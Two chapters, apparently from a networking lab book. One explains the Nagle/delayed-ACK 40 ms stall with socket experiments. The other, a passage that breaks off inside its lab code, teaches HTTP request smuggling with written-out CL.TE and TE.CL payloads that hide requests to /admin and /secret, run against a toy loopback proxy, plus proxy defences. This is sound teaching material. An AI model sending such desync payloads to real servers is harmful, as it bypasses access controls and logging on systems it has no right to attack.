title: Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
text:
Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
Two TCP features that each save packets can together add a fixed 40 ms to every request. Nagle’s algorithm (sender side) holds a small segment while an earlier small segment is still unacknowledged. Delayed ACK (receiver side) waits, up to a timer, before acknowledging, hoping to piggyback the ACK on a reply. When a client sends one request as two small writes and then waits for the answer, the server cannot reply (it has only half the request), so it delays its ACK; the client cannot send the second half until that ACK arrives. Both sides wait for the timer. Nothing is lost, nothing is retransmitted, CPU is idle, and p50 latency is 40 ms on a link with a 20 µs RTT. This chapter reproduces the stall on loopback, catches it in ss, and measures every fix, including the one people reach for first (TCP_NODELAY) and what it costs.

title: Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
text:
Learning goals

State Nagle’s rule (RFC 896, RFC 9293 §3.7.4) and Linux’s Minshall variant, and the delayed-ACK rule (RFC 9293 §3.8.6.3)
Recognise the write-write-read pattern and predict the stall from it
Read ato, unacked and notsent in ss -ti while the stall is happening
Compare the fixes: one write (writev/sendmsg), TCP_CORK, MSG_MORE, TCP_NODELAY and TCP_QUICKACK, and say which side each one acts on
Explain what Nagle protects against, and measure what TCP_NODELAY costs in segments

Lab platform: Linux 6.12, iproute2 6.15 (ss, nstat), Python 3.13.5, run as an unprivileged user over 127.0.0.1. No namespaces, no tc, no root. Every listing output below is pasted from those runs. Kernel behaviour is quoted from include/net/tcp.h and net/ipv4/tcp_output.c in Linux 6.12; the same constants and tcp_nagle_check() are unchanged in Linux 7.2, the current stable series.

title: Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
text:
Mental model



Write-write-read: Nagle × delayed ACK


 client                                       server
   │ write(hdr, 10 B) ── sent: nothing unacked ──►│  has half a request
   │ write(body, 10 B)                             │  nothing to send yet
   │   Nagle: a small segment is unacked → HOLD    │  delayed ACK: wait (ato 40 ms)
   │                     ... up to ~40 ms ...      │
   │◄──────────── bare ACK (delack timer) ─────────│
   │ body released ───────────────────────────────►│  full request → reply
   │◄──────────────── reply (+ ACK) ───────────────│
The two rules:









Rule
Where
What it says
Linux




Nagle (RFC 896; RFC 9293 §3.7.4, SHLD-7, with a per-connection off switch, MUST-17)
Sender
While data is unacknowledged, buffer small writes until the ACK arrives or a full MSS is ready
tcp_nagle_check() with Minshall’s variant (RFC 9293 App. A.3): hold a sub-MSS segment only while a previous sub-MSS segment is unacknowledged


Delayed ACK (RFC 1122 §4.2.3.2; RFC 9293 §3.8.6.3, SHLD-18/19, MUST-40)
Receiver
ACK at least every second full-sized segment; otherwise wait (less than 0.5 s) to piggyback the ACK on data
TCP_DELACK_MIN = TCP_ATO_MIN = HZ/25 = 40 ms, TCP_DELACK_MAX = HZ/5 = 200 ms; a new connection starts in quick-ACK mode (up to TCP_MAX_QUICKACKS = 16 immediate ACKs)



Neither rule is a bug. Together they deadlock until the timer fires, whenever all of these hold:

The sender writes one logical message as two or more sub-MSS writes.
The receiver cannot respond until it has the whole message.
The sender waits for the response before writing more.

HTTP/1.x clients that write headers and body separately, RPC frameworks that write a length prefix and then the payload, database drivers, Redis/memcached clients and SSH-like interactive protocols all fit this pattern unless they batch their writes or set TCP_NODELAY.

title: Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
text:
Concepts — the knobs









Knob
Side
Scope
Effect




One write: build the message in user space, or writev()/sendmsg() with an iovec
Sender
Per message
The message leaves as one segment; Nagle has nothing to hold. Portable.


TCP_CORK (Linux)
Sender
Until cleared
Hold partial segments; clearing it sends them now. 200 ms ceiling. Overrides TCP_NODELAY.


MSG_MORE flag on send() (Linux)
Sender
One call
Same as TCP_CORK for that call: “more is coming”; the next send without the flag pushes.


TCP_NODELAY
Sender
Socket
Disable Nagle: every write is sent as soon as cwnd/rwnd allow. Portable (RFC 9293 MUST-17).


TCP_QUICKACK (Linux)
Receiver
Not sticky
Enter quick-ACK mode now. The stack drops back to delayed ACKs on its own (tcp(7): “This flag is not permanent”).


net.ipv4.tcp_autocorking (default 1)
Sender
Host
Coalesce small writes while an earlier packet is still queued in the host. Counter TcpExtTCPAutoCorking.


ip route ... quickack 1
Receiver
Route
Quick-ACK for every connection on that route (needs root; not run here).

title: Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
section: Lab — reproduce the stall and measure the fixes
text:
Lab — reproduce the stall and measure the fixes
# nagle_lab.py — write-write-read over loopback: the Nagle x delayed-ACK stall, and the ways out
# usage: python3 nagle_lab.py [REQUESTS]
import socket, statistics, struct, sys, threading, time

HDR, BODY = b"H" * 10, b"B" * 10          # one request, sent as two small writes
REQ, RESP = len(HDR) + len(BODY), b"R" * 20
N = int(sys.argv[1]) if len(sys.argv) > 1 else 50

def data_segs_out(s):                     # struct tcp_info -> tcpi_data_segs_out
    f = struct.unpack("8B24I4Q6I", s.getsockopt(socket.IPPROTO_TCP, socket.TCP_INFO, 160))
    return f[41]

def recv_exact(s, n):
    buf = b""
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed")
        buf += chunk
    return buf

def server(lsock, quickack):
    c, _ = lsock.accept()
    if quickack == "once":
        c.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
    for _ in range(N):
        if quickack == "every read":      # not sticky: re-arm before every read
            c.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
        recv_exact(c, REQ)
        c.sendall(RESP)
    c.close()

def run(mode):
    lsock = socket.create_server(("127.0.0.1", 0))
    quickack = {"QUICKACK once": "once", "QUICKACK every read": "every read"}.get(mode)
    t = threading.Thread(target=server, args=(lsock, quickack))
    t.start()
    s = socket.create_connection(lsock.getsockname())
    if mode == "TCP_NODELAY":
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    lat = []
    for _ in range(N):
        t0 = time.perf_counter()
        if mode == "one write":
            s.sendall(HDR + BODY)
        elif mode == "TCP_CORK":
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_CORK, 1)
            s.sendall(HDR); s.sendall(BODY)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_CORK, 0)   # uncork = send now
        elif mode == "MSG_MORE":
            s.send(HDR, socket.MSG_MORE); s.sendall(BODY)
        else:                             # default, TCP_NODELAY, server-side QUICKACK
            s.sendall(HDR); s.sendall(BODY)
        recv_exact(s, len(RESP))
        lat.append((time.perf_counter() - t0) * 1e3)
    segs = data_segs_out(s)
    s.close(); t.join(); lsock.close()
    first = " ".join(f"{x:.2f}" for x in lat[:3])
    lat.sort()
    print(f"{mode:19} first3 [{first}]  median {statistics.median(lat):6.3f} ms"
          f"  p90 {lat[int(0.9 * N)]:6.3f} ms  total {sum(lat):6.1f} ms  data segs {segs:3}")

print(f"{N} requests of {REQ} bytes (two writes of 10), {len(RESP)}-byte reply, 127.0.0.1")
for mode in ("Nagle (default)", "TCP_NODELAY", "one write", "TCP_CORK", "MSG_MORE",
             "QUICKACK once", "QUICKACK every read"):
    run(mode)
nstat -n                  # reset the nstat history for this network namespace
python3 nagle_lab.py
nstat TcpExtDelayedACKs   # delayed ACKs sent since the reset
50 requests of 20 bytes (two writes of 10), 20-byte reply, 127.0.0.1
Nagle (default)     first3 [0.26 42.26 44.12]  median 44.014 ms  p90 44.163 ms  total 2154.4 ms  data segs 100
TCP_NODELAY         first3 [0.43 0.38 0.49]  median  0.031 ms  p90  0.070 ms  total    2.9 ms  data segs 100
one write           first3 [0.25 0.04 0.06]  median  0.029 ms  p90  0.032 ms  total    1.7 ms  data segs  50
TCP_CORK            first3 [0.10 0.04 0.03]  median  0.031 ms  p90  0.034 ms  total    1.6 ms  data segs  50
MSG_MORE            first3 [0.08 0.04 0.03]  median  0.030 ms  p90  0.033 ms  total    1.6 ms  data segs  50
QUICKACK once       first3 [0.10 40.85 43.98]  median 43.990 ms  p90 44.201 ms  total 2152.9 ms  data segs 100
QUICKACK every read first3 [0.10 0.06 0.04]  median  0.036 ms  p90  0.039 ms  total    1.9 ms  data segs 100
#kernel
TcpExtDelayedACKs               134                0.0
Read it line by line:

Nagle (default): the first request takes 0.26 ms: the connection is fresh and in quick-ACK mode, so the server ACKs the header at once. From the second request on, every request takes about 44 ms: the 40 ms minimum delayed-ACK timeout plus a few milliseconds of timer granularity. Fifty requests take 2.15 s instead of 2 ms. The client sent 100 data segments: header and body separately.
TCP_NODELAY: same two writes, same 100 segments, but the body is not held: median 31 µs.
one write / TCP_CORK / MSG_MORE: the request leaves as one segment (50 data segments for 50 requests) and the stall is gone. This is the best result: fast and half the packets.
QUICKACK once: setting TCP_QUICKACK on the server right after accept() does nothing useful. The connection is already in quick-ACK mode then, and it leaves that mode by itself after a few exchanges: the stall starts at request two, exactly like the default.
QUICKACK every read: re-arming it before every recv() fixes the stall from the receiver side, with 100 segments. That works when you own the server but not the client; it is also Linux-only and costs a system call per read.
TcpExtDelayedACKs counted 134: about 98 from the two stalling runs (49 stalled requests each), and the rest from other traffic in this shared network namespace. nstat counters are per network namespace, not per process.

title: Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
section: Lab — catch the stall in ss
text:
Lab — catch the stall in ss
# catch_stall.py — freeze the moment of the stall and look at both sockets with ss -ti
import socket, subprocess, threading, time

lsock = socket.create_server(("127.0.0.1", 0))
port = lsock.getsockname()[1]
ready = threading.Event()

def server():
    c, _ = lsock.accept()
    for _ in range(3):                    # warm up: leave the initial quick-ACK phase
        c.recv(20); c.sendall(b"R" * 20)
    ready.set()
    c.recv(10)                            # got the header, still waiting for the body
    time.sleep(0.2); c.close()

t = threading.Thread(target=server); t.start()
s = socket.create_connection(("127.0.0.1", port))
for _ in range(3):
    s.sendall(b"Q" * 20); s.recv(20)
ready.wait()
s.sendall(b"H" * 10)                      # goes out at once: nothing unacknowledged
s.sendall(b"B" * 10)                      # Nagle holds this: a small segment is unacked
time.sleep(0.005)                         # 5 ms into the up-to-40 ms wait
out = subprocess.run(["ss", "-tniH", "state", "established", f"( sport = :{port} or dport = :{port} )"],
                     capture_output=True, text=True).stdout
keep = ("ato", "mss", "unacked", "notsent", "lastsnd", "lastack", "bytes_sent", "bytes_received")
lines = out.splitlines()
for addrs, info in zip(lines[0::2], lines[1::2]):
    local, peer = addrs.split()[2:4]
    who = "server" if local.endswith(f":{port}") else "client"
    print(f"{who}  {local} -> {peer}")
    print("        " + " ".join(w for w in info.split() if w.split(":")[0] in keep))
s.close(); t.join()
python3 catch_stall.py
server  127.0.0.1:45499 -> 127.0.0.1:45560
        ato:40 mss:32768 bytes_sent:60 bytes_received:70 lastsnd:8 lastack:8
client  127.0.0.1:45560 -> 127.0.0.1:45499
        ato:40 mss:32768 bytes_sent:70 bytes_received:60 lastsnd:8 lastack:8 unacked:1 notsent:10
Eight milliseconds into the stall the evidence is in two fields. On the client: unacked:1 (the header segment is in flight, unacknowledged) and notsent:10 (the 10-byte body is in the send queue and Nagle has not sent it). On the server: ato:40, the delayed-ACK timeout, and nothing to send. bytes_sent:70 on the client is three 20-byte warm-up requests plus the header; the body is not counted until it leaves. In production, ss -tni showing a small, persistent notsent on a request/response socket whose peer shows ato:40 is the stall. A packet capture shows it as a 40 ms gap between a bare ACK from the server and the client’s next small segment.

title: Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
text:
Lab — what Nagle is for
# tiny_writes.py — what Nagle is FOR: 20,000 one-byte writes, counted in segments on the wire
import socket, struct, threading, time

WRITES = 20_000

def data_segs_out(s):
    f = struct.unpack("8B24I4Q6I", s.getsockopt(socket.IPPROTO_TCP, socket.TCP_INFO, 160))
    return f[41]

def drain(lsock, got):
    c, _ = lsock.accept()
    n = 0
    while chunk := c.recv(65536):
        n += len(chunk)
    got.append(n); c.close()

for nodelay in (0, 1, 0, 1):
    lsock = socket.create_server(("127.0.0.1", 0)); got = []
    t = threading.Thread(target=drain, args=(lsock, got)); t.start()
    s = socket.create_connection(lsock.getsockname())
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, nodelay)
    t0 = time.perf_counter()
    for _ in range(WRITES):
        s.send(b"x")
    dt = time.perf_counter() - t0
    segs = data_segs_out(s)
    s.close(); t.join(); lsock.close()
    print(f"TCP_NODELAY={nodelay}  {WRITES} writes -> {segs:6} data segments"
          f"  ({WRITES / segs:5.1f} bytes/segment)  {dt * 1e3:6.1f} ms  received {got[0]}")
python3 tiny_writes.py
TCP_NODELAY=0  20000 writes ->   5418 data segments  (  3.7 bytes/segment)    36.4 ms  received 20000
TCP_NODELAY=1  20000 writes ->  19135 data segments  (  1.0 bytes/segment)    79.1 ms  received 20000
TCP_NODELAY=0  20000 writes ->   5175 data segments  (  3.9 bytes/segment)    39.8 ms  received 20000
TCP_NODELAY=1  20000 writes ->  20000 data segments  (  1.0 bytes/segment)    81.4 ms  received 20000
An application that writes one byte at a time (unbuffered logging, keystrokes, a naive serializer) is what Nagle was designed for in 1984. With Nagle on, 20,000 writes left as about 5,200–5,400 segments; with TCP_NODELAY as 19,135–20,000 segments (the few merges come from autocorking). Each segment carries 40+ bytes of IP and TCP headers for 1 byte of data. On loopback the ACK comes back in microseconds, so Nagle can only batch about 4 bytes per segment. On a real path with a 20 ms RTT Nagle allows at most one small segment in flight per round trip, so the same loop (about 40 ms of writes) would leave as a handful of segments, each carrying everything written during one round trip (not run here: adding delay needs tc netem, see Try this). That is the cost of setting TCP_NODELAY everywhere without also batching writes: more packets, more interrupts, more per-packet CPU on every hop, and on lossy or metered links (cellular, satellite, IoT) a visible bill.

title: Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
text:
Case — choosing the fix







Situation
Fix




You own the sender code
Build the whole message and write it once (writev/sendmsg, a buffered writer you flush per message). Then decide on TCP_NODELAY separately.


Request/response protocol whose library already writes each message once (gRPC, HTTP/2, most modern RPC and DB drivers)
TCP_NODELAY on. Most such libraries already set it: Go’s net package sets it on every TCP connection by default; Node.js http.createServer defaults to noDelay: true since v18, while a raw net.Socket still starts with Nagle on. Check yours.


Header + sendfile() body (static file servers)
TCP_CORK around the header write and the sendfile(), then uncork. Or MSG_MORE on the header.


Bulk transfer (backups, replication streams)
Nothing: writes are ≥ MSS, Nagle never holds them.


You own only the receiver and cannot change clients
TCP_QUICKACK before every read, or a quickack 1 route for those clients’ prefix. Treat it as a workaround.


Interactive byte streams (terminals)
Depends on what matters more: latency (SSH sets TCP_NODELAY for interactive sessions) or packet count.

title: Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
text:
The trap
Trap: “it’s the network.” The stall is entirely host-side: no loss, no retransmission, no queueing. Pings are fast, ss shows a tiny RTT (tens of microseconds on loopback), yet requests take 40 ms. The tell is latency that clusters at ~40 ms (or ~200 ms on stacks whose delayed-ACK timer is 200 ms) regardless of path RTT or load.
Trap: “TCP_NODELAY everywhere.” It removes the stall but not the cause, two writes per message. You now send twice the packets (100 vs 50 data segments in the first lab), and a chatty writer can send one packet per byte (third lab). Batch first; then TCP_NODELAY is cheap.
Trap: “set TCP_QUICKACK once.” It is not a mode you turn on; it is a nudge. The first lab shows “QUICKACK once” stalls exactly like the default.
Trap: “TCP_CORK and forget.” A corked socket holds partial data up to 200 ms. Forgetting to uncork turns a 40 ms stall into a 200 ms one. MSG_MORE cannot be forgotten: it applies to one call.
Trap: “the first request was fast, so we’re fine.” Quick-ACK mode at connection start hides the stall for the first exchange. Benchmarks that open a new connection per request never see it; connection pools see it on every request.

title: Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
text:
The boring rule
Write each message with one system call. Then turn on TCP_NODELAY for request/response protocols, and leave Nagle on for streams of tiny writes you cannot batch. When latency clusters at 40 ms, look for notsent on the sender and ato:40 on the receiver before you look at the network.

title: Small Writes in TCP: Nagle’s Algorithm, Delayed ACKs, and the 40 ms Stall
text:
Try this

Change HDR to 1,000 bytes and BODY to 70,000 bytes in nagle_lab.py. Does the default still stall? Why does a body larger than one MSS change the answer?
Make the server write its reply as two 10-byte writes too. Which side stalls now, and does client-side TCP_NODELAY still fix it?
Run nagle_lab.py with N=200 and plot the latency of each request. How many fast requests do you get before the stall starts on this kernel?
With a capture tool (tcpdump -ni lo port PORT) where one is available, find the bare ACK and the body segment around each 40 ms gap.
On a machine you control, add a 20 ms delay to a test interface (tc qdisc add dev IF root netem delay 20ms, as root or in a network namespace) and re-run tiny_writes.py. How many bytes per segment does Nagle batch now?

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
HTTP/1.1 is a text protocol that multiplexes requests on a persistent TCP connection by framing: each message is a head, a blank line, and a body whose length is declared either by Content-Length or by Transfer-Encoding: chunked. When a reverse proxy (the front-end) and an origin (the back-end) disagree about which declaration wins, the byte stream desynchronises. Bytes the front-end treated as the body of request A become request B on the back-end. That second request is invisible to the front-end’s access-control, logging and caching logic. James Kettle’s HTTP Desync Attacks work, and a long trail of CVEs in popular proxies, turned this from a curiosity into an operator skill.
This chapter reproduces the two classical desync patterns — CL.TE and TE.CL — plus Transfer-Encoding obfuscation, against a tiny Python front-end/back-end pair that speaks only the framing rules under test. The point is not to ship the toy as a scanner; it is to make the byte-level disagreement undeniable, then map it onto the RFC 9112 requirements and the defences real proxies expose.

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
Learning goals

Explain why HTTP/1.1 request framing is ambiguous when both Content-Length and Transfer-Encoding are present.
Reproduce a CL.TE desync: front-end sees one request, back-end sees a smuggled second request.
Read TE.CL offline framing and recognise the “hungry Content-Length” failure mode.
Distinguish tolerant TE parsers (cow, chunked) from strict ones that reject obfuscation.
List concrete proxy defences (reject dual CL+TE, normalise TE, prefer HTTP/2+ to origin).
Know which hops are still exposed when the browser speaks HTTP/2 but the proxy downgrades to HTTP/1.1 upstream.

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
Version note
Lab run on Linux 6.12.94+ inside unshare -urn with Python 3.13. The toy proxy is not nginx, HAProxy, Envoy or Traefik; production directives below are taken from their current docs and are marked (not run here).

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
Framing rules in RFC 9112
RFC 9112 §6.3 says a sender MUST NOT generate a message that includes both Content-Length and a non-identity Transfer-Encoding. A recipient that receives both is told, in §6.1, that Transfer-Encoding overrides Content-Length. Many implementations historically did the opposite, or accepted obfuscated TE values that a neighbour rejected. The smuggling taxonomy names the disagreement:









Name
Front-end frames with
Back-end frames with
Typical effect




CL.TE
Content-Length
Transfer-Encoding
Smuggled request runs on the back-end; front-end never logged it as its own request.


TE.CL
Transfer-Encoding
Content-Length
Front-end ends the body early; back-end is still reading body bytes and may absorb the next request into the previous body.


TE.TE
both speak TE, but disagree on what counts as chunked
obfuscation / duplicate headers
One side rejects; the other accepts and desyncs.



HTTP/2 and HTTP/3 replace text framing with length-prefixed binary frames. A hop that speaks HTTP/2 end-to-end cannot CL.TE-smuggle on that hop. The residual risk is an HTTP/1.1 downgrade between proxy and origin.
Client --H2--> Front-end --H1--> Back-end
                 ^
                 desync lives on this H1 connection

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
CL.TE in detail
The attacker sends one TCP payload that is a single request to a CL-preferring front-end, but whose body is a completed chunked message followed by a second request:
POST / HTTP/1.1
Host: v
Content-Length: 39
Transfer-Encoding: chunked

0\r\n
\r\n
GET /admin HTTP/1.1
Host: v
\r\n
The front-end ignores TE, consumes Content-Length bytes of body, and forwards exactly one upstream request. The back-end sees Transfer-Encoding: chunked, reads a zero-length chunk, ends the body, and treats GET /admin... as a new request on the same keep-alive connection. From the front-end’s point of view /admin never happened.

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
TE.CL in detail
Swap the preferences. The front-end honours TE, ends the body at the 0 chunk, and may then frame the leftover bytes as a second client request. The back-end honours CL and is still waiting for Content-Length bytes of body. Those bytes arrive as the front-end’s second forwarded request — which therefore never executes as its own request on the back-end. Offline framing of the same bytes makes the disagreement visible without timing races; the live toy often hangs the upstream read, which is itself a production symptom (worker stuck on a desynced connection).

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
Obfuscated Transfer-Encoding
Tolerant parsers treat any TE header whose value contains the token chunked as chunked encoding — including cow, chunked, chunked, identity, or two TE headers where only the second says chunked. Strict parsers accept only a single clean chunked token and reject everything else with 400. RFC 9112’s “reject both CL and TE” is the stronger rule; normalisation to a single TE is the pragmatic middle ground many proxies implement.

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
The lab

Lab files
smuggle.py:
#!/usr/bin/env python3
"""HTTP request smuggling: CL.TE and TE.CL desync in a toy proxy pair.

Two parsers share a TCP byte stream. Each has a framing rule:

  cl_frame  — trust Content-Length; ignore Transfer-Encoding for framing
  te_frame  — trust Transfer-Encoding when the value contains "chunked"
              (including obfuscations like "cow, chunked")

The front-end consumes bytes with its rule and forwards each framed request
to the back-end over a persistent upstream connection. The back-end then
re-frames what it receives with ITS rule. When the rules disagree, bytes the
front-end treated as a body become a new request on the back-end.
"""
import socket, threading, time, re

def ports(n):
    return ("127.0.0.1", 18080 + n), ("127.0.0.1", 18180 + n)

def read_chunked(buf):
    body = b""; rest = buf
    while True:
        if b"\r\n" not in rest: return None, buf
        line, rest = rest.split(b"\r\n", 1)
        try: size = int(line.split(b";")[0].strip(), 16)
        except ValueError: return None, buf
        if len(rest) < size + 2: return None, buf
        if size == 0:
            if rest.startswith(b"\r\n"):
                return body, rest[2:]
            while True:
                if b"\r\n" not in rest: return None, buf
                line, rest = rest.split(b"\r\n", 1)
                if line == b"": return body, rest
        body += rest[:size]; rest = rest[size:]
        if not rest.startswith(b"\r\n"): return None, buf
        rest = rest[2:]

def parse_headers(head):
    lines = head.split(b"\r\n")
    headers = {}
    for h in lines[1:]:
        if b":" not in h: continue
        k, v = h.split(b":", 1)
        headers.setdefault(k.strip().lower(), []).append(v.strip())
    return lines[0], headers

def cl_frame(buf):
    if b"\r\n\r\n" not in buf: return None, buf
    head, rest = buf.split(b"\r\n\r\n", 1)
    _, headers = parse_headers(head)
    cl = 0
    if b"content-length" in headers:
        try: cl = int(headers[b"content-length"][0])
        except ValueError: cl = 0
    if len(rest) < cl: return None, buf
    return head + b"\r\n\r\n" + rest[:cl], rest[cl:]

def te_frame(buf):
    if b"\r\n\r\n" not in buf: return None, buf
    head, rest = buf.split(b"\r\n\r\n", 1)
    _, headers = parse_headers(head)
    te_vals = headers.get(b"transfer-encoding", [])
    if any(b"chunked" in v.lower() for v in te_vals):
        body, rest2 = read_chunked(rest)
        if body is None: return None, buf
        return head + b"\r\n\r\n" + body, rest2
    return cl_frame(buf)

def te_strict_frame(buf):
    if b"\r\n\r\n" not in buf: return None, buf
    head, rest = buf.split(b"\r\n\r\n", 1)
    _, headers = parse_headers(head)
    te_vals = [v.lower().strip() for v in headers.get(b"transfer-encoding", [])]
    if te_vals and te_vals != [b"chunked"]:
        raise ValueError(f"obfuscated TE rejected: {te_vals!r}")
    if te_vals == [b"chunked"]:
        body, rest2 = read_chunked(rest)
        if body is None: return None, buf
        return head + b"\r\n\r\n" + body, rest2
    return cl_frame(buf)

class Backend(threading.Thread):
    def __init__(self, frame, addr):
        super().__init__(daemon=True)
        self.frame = frame; self.seen = []; self.addr = addr
        self.s = socket.socket(); self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(addr); self.s.listen(5); self.s.settimeout(0.4)
        self.stop = False
    def run(self):
        while not self.stop:
            try: c, _ = self.s.accept()
            except socket.timeout: continue
            c.settimeout(0.8); buf = b""
            try:
                while True:
                    try: d = c.recv(4096)
                    except socket.timeout: break
                    if not d: break
                    buf += d
                    while True:
                        try: req, buf = self.frame(buf)
                        except ValueError as e:
                            self.seen.append(b"REJECT: " + str(e).encode())
                            c.sendall(b"HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n")
                            buf = b""; break
                        if req is None: break
                        self.seen.append(req)
                        path = req.split(b" ", 2)[1]
                        body = b"OK " + path + b"\n"
                        c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n" % len(body) + body)
            except OSError:
                pass
            finally:
                try: c.close()
                except OSError: pass
    def close(self):
        self.stop = True
        try: self.s.close()
        except OSError: pass

class Frontend(threading.Thread):
    def __init__(self, frame, addr, back):
        super().__init__(daemon=True)
        self.frame = frame; self.forwarded = []; self.addr = addr; self.back = back
        self.s = socket.socket(); self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(addr); self.s.listen(5); self.s.settimeout(0.4)
        self.stop = False
    def run(self):
        while not self.stop:
            try: c, _ = self.s.accept()
            except socket.timeout: continue
            c.settimeout(0.8); buf = b""
            try:
                while True:
                    try: d = c.recv(4096)
                    except socket.timeout: break
                    if not d: break
                    buf += d
                upstream = socket.create_connection(self.back, timeout=1)
                while True:
                    try: req, buf = self.frame(buf)
                    except ValueError as e:
                        c.sendall(b"HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n")
                        self.forwarded.append(b"REJECT: " + str(e).encode())
                        break
                    if req is None: break
                    self.forwarded.append(req)
                    upstream.sendall(req)
                    resp = b""
                    while b"\r\n\r\n" not in resp:
                        r = upstream.recv(4096)
                        if not r: break
                        resp += r
                    if b"Content-Length:" in resp.split(b"\r\n\r\n", 1)[0]:
                        m = re.search(br"Content-Length:\s*(\d+)", resp, re.I)
                        need = int(m.group(1))
                        head, body = resp.split(b"\r\n\r\n", 1)
                        while len(body) < need:
                            body += upstream.recv(need - len(body))
                        resp = head + b"\r\n\r\n" + body[:need]
                    c.sendall(resp)
                upstream.close()
            except OSError:
                pass
            finally:
                try: c.close()
                except OSError: pass
    def close(self):
        self.stop = True
        try: self.s.close()
        except OSError: pass

def show(label, reqs):
    print(f"   {label} saw {len(reqs)} request(s):")
    for i, r in enumerate(reqs, 1):
        if r.startswith(b"REJECT:"):
            print(f"      [{i}] {r.decode()}"); continue
        line = r.split(b"\r\n", 1)[0].decode(errors="replace")
        mark = ""
        if any(x in r for x in (b"GET /admin", b"GET /secret", b"DELETE /")):
            # smuggled if this is not the only request, or if front didn't list it
            mark = "  <== SMUGGLED" if label.startswith("back") else "  (visible to front)"
        print(f"      [{i}] {line}{mark}")

def run(n, title, front_frame, back_frame, payload):
    print(f"\n== {title}")
    front_addr, back_addr = ports(n)
    back = Backend(back_frame, back_addr); back.start()
    front = Frontend(front_frame, front_addr, back_addr); front.start(); time.sleep(0.08)
    s = socket.create_connection(front_addr, timeout=1)
    s.sendall(payload); time.sleep(0.35)
    try:
        s.settimeout(0.3)
        while s.recv(4096): pass
    except Exception:
        pass
    s.close(); time.sleep(0.15)
    show("front-end", front.forwarded)
    show("back-end", back.seen)
    # The interesting bit: requests the back-end saw that the front-end did not
    # forward as their own request line.
    front_lines = {r.split(b"\r\n", 1)[0] for r in front.forwarded if not r.startswith(b"REJECT:")}
    smug = [r for r in back.seen
            if not r.startswith(b"REJECT:") and r.split(b"\r\n", 1)[0] not in front_lines]
    if smug:
        print("   desync: back-end requests with no matching front-end request line:")
        for r in smug:
            print(f"      {r.split(b'\r\n', 1)[0].decode()}")
    front.close(); back.close(); time.sleep(0.05)


def offline(title, payload, left, right, left_name, right_name):
    print(f"\n== {title}")
    a, rest_a = [], payload
    while True:
        try: req, rest_a = left(rest_a)
        except ValueError as e:
            a.append(b"REJECT: " + str(e).encode()); break
        if req is None: break
        a.append(req)
    b, rest_b = [], payload
    while True:
        try: req, rest_b = right(rest_b)
        except ValueError as e:
            b.append(b"REJECT: " + str(e).encode()); break
        if req is None: break
        b.append(req)
    show(left_name, a)
    show(right_name, b)

def main():
    print("HTTP request-smuggling lab (toy front-end / back-end)")

    smug = b"GET /admin HTTP/1.1\r\nHost: v\r\n\r\n"
    body = b"0\r\n\r\n" + smug
    payload_clte = (
        b"POST / HTTP/1.1\r\nHost: v\r\n"
        + b"Content-Length: %d\r\n" % len(body)
        + b"Transfer-Encoding: chunked\r\n\r\n" + body
    )
    run(1, "1  CL.TE live (front=CL, back=TE)",
        cl_frame, te_frame, payload_clte)
    offline("1b  CL.TE offline framing of the same bytes",
            payload_clte, cl_frame, te_frame, "CL parser", "TE parser")

    smug = b"GET /secret HTTP/1.1\r\nHost: v\r\n\r\n"
    payload_tecl = (
        b"POST / HTTP/1.1\r\nHost: v\r\n"
        + b"Content-Length: %d\r\n" % (len(smug))
        + b"Transfer-Encoding: chunked\r\n\r\n"
        + b"0\r\n\r\n" + smug
    )
    offline("2  TE.CL offline framing",
            payload_tecl, te_frame, cl_frame, "TE parser", "CL parser")

    # Live TE.CL with a second victim request on the same client connection.
    # Front ends POST at the 0-chunk, then frames GET /secret as its own second
    # request and forwards both. Back with CL on the first request is still
    # waiting for Content-Length bytes; the forwarded GET /secret arrives as
    # those body bytes, so /secret never executes as its own request.
    print("\n== 2b  TE.CL live with victim request (front=TE, back=CL)")
    front_addr, back_addr = ports(2)
    back = Backend(cl_frame, back_addr); back.start()
    front = Frontend(te_frame, front_addr, back_addr); front.start(); time.sleep(0.08)
    s = socket.create_connection(front_addr, timeout=1)
    s.sendall(payload_tecl)
    time.sleep(0.5)
    try:
        s.settimeout(0.3)
        while s.recv(4096): pass
    except Exception:
        pass
    s.close(); time.sleep(0.2)
    show("front-end", front.forwarded)
